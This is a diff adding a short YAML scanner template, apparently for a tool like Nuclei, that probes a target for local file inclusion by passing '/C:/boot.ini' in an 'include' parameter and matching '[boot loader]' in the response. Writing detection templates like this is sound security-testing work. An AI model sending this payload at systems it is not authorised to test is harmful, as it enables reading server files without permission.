@@ -1,0 +1,20 @@
+id: lfi4-19
+name: 'System file /C:/boot.ini via include'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads /C:/boot.ini via include'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      include:
+        - '/C:/boot.ini'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[boot loader]'
